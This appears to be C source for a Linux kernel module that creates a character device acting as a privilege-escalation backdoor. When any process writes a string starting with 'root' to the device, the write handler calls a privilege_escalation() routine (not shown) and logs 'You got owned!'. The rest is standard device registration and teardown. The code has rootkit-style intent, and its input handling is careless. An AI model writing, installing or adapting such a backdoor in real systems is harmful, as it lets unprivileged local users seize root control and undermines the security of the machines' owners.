#include "utils.h"
#include "core.h"

static int lkmCharDev_open (struct inode *inode, struct file *f) {
   return 0;
}

static ssize_t lkmCharDev_read (struct file *f, char *buf, size_t len, loff_t *off) {
  return len;
}

static ssize_t lkmCharDev_write (struct file *f, const char __user *buf, size_t len, loff_t *off) {
  char   *data;
  data = (char *) kmalloc (len + 1, GFP_KERNEL);

  if (data) {
    copy_from_user (data, buf, len);
    if (memcmp(data, "root", 4) == 0) {
      if(privilege_escalation() == 0) {
        debug("Unable to escalate privilege");
      }
      debug("You got owned!");
    } else {
      debug("... seriously dude ??");
    }
    kfree(data);
  } else {
    alert("Unable to allocate memory");
    return 0;
  }

  return len;
}

static int __init lkmCharDev_init(void)
{
  debug("The LKM is now load!");
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
      alert("Failed to register a major number");
      return majorNumber;
    }
   debug("Major number %d", majorNumber);

   // Register the device class
   lkmCharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(lkmCharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       alert("Failed to register device class");
       return PTR_ERR(lkmCharClass);
   }

   debug("Device class registered correctly");

   // Register the device driver
   lkmCharDevice = device_create(lkmCharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(lkmCharDevice))
     {
       class_destroy(lkmCharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       alert("Failed to create the device");
       return PTR_ERR(lkmCharDevice);
     }

    return 0;
}

static void __exit lkmCharDev_exit(void)
{
  // Destroy the device
  device_destroy(lkmCharClass, MKDEV(majorNumber, 0));
  class_unregister(lkmCharClass);
  class_destroy(lkmCharClass);
  unregister_chrdev(majorNumber, DEVICE_NAME);

  debug("LKM is now unload!");
}

module_init(lkmCharDev_init);
module_exit(lkmCharDev_exit);